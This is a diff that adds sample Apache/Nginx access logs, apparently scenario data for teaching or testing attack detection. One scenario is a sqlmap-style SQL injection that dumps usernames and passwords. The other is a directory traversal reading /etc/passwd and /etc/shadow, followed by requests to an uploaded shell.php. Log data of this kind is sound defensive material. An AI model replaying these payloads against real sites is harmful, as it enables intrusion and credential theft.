@@ -1,0 +1,24 @@
+======================================
+Part 3: Web Server Access Logs
+======================================
+--------------------------------------------------------------------------
+Scenario 6: SQL Injection Attack (Apache/Nginx Access Log)
+--------------------------------------------------------------------------
+203.0.113.100 - - [21/Aug/2024:20:15:33 +0000] "GET /login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (compatible; scanner/1.0)"
+203.0.113.100 - - [21/Aug/2024:20:15:35 +0000] "POST /login.php HTTP/1.1" 200 1455 "http://example.com/login.php" "Mozilla/5.0 (compatible; scanner/1.0)"
+203.0.113.100 - - [21/Aug/2024:20:15:37 +0000] "GET /admin.php?id=1' OR '1'='1 HTTP/1.1" 200 2344 "-" "Mozilla/5.0 (compatible; sqlmap/1.0)"
+203.0.113.100 - - [21/Aug/2024:20:15:39 +0000] "GET /admin.php?id=1' UNION SELECT NULL,NULL,NULL-- HTTP/1.1" 200 2344 "-" "Mozilla/5.0 (compatible; sqlmap/1.0)"
+203.0.113.100 - - [21/Aug/2024:20:15:41 +0000] "GET /admin.php?id=1' UNION SELECT user(),database(),version()-- HTTP/1.1" 200 2567 "-" "Mozilla/5.0 (compatible; sqlmap/1.0)"
+203.0.113.100 - - [21/Aug/2024:20:15:43 +0000] "GET /admin.php?id=1' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata-- HTTP/1.1" 200 3122 "-" "Mozilla/5.0 (compatible; sqlmap/1.0)"
+203.0.113.100 - - [21/Aug/2024:20:15:45 +0000] "GET /admin.php?id=1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='users'-- HTTP/1.1" 200 4234 "-" "Mozilla/5.0 (compatible; sqlmap/1.0)"
+203.0.113.100 - - [21/Aug/2024:20:15:47 +0000] "GET /admin.php?id=1' UNION SELECT username,password,email FROM users-- HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (compatible; sqlmap/1.0)"
+--------------------------------------------------------------------------
+Scenario 7: Directory Traversal and File Inclusion
+--------------------------------------------------------------------------
+192.168.1.50 - - [21/Aug/2024:21:22:15 +0000] "GET /index.php?page=../../../etc/passwd HTTP/1.1" 200 2344 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+192.168.1.50 - - [21/Aug/2024:21:22:17 +0000] "GET /index.php?page=../../../etc/shadow HTTP/1.1" 403 1234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+192.168.1.50 - - [21/Aug/2024:21:22:19 +0000] "GET /index.php?page=../../../proc/version HTTP/1.1" 200 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+192.168.1.50 - - [21/Aug/2024:21:22:21 +0000] "GET /index.php?page=../../../var/log/apache2/access.log HTTP/1.1" 200 45678 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+192.168.1.50 - - [21/Aug/2024:21:22:23 +0000] "GET /uploads/shell.php HTTP/1.1" 200 89 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+192.168.1.50 - - [21/Aug/2024:21:22:25 +0000] "POST /uploads/shell.php HTTP/1.1" 200 2456 "http://example.com/uploads/shell.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+--------------------------------------------------------------------------
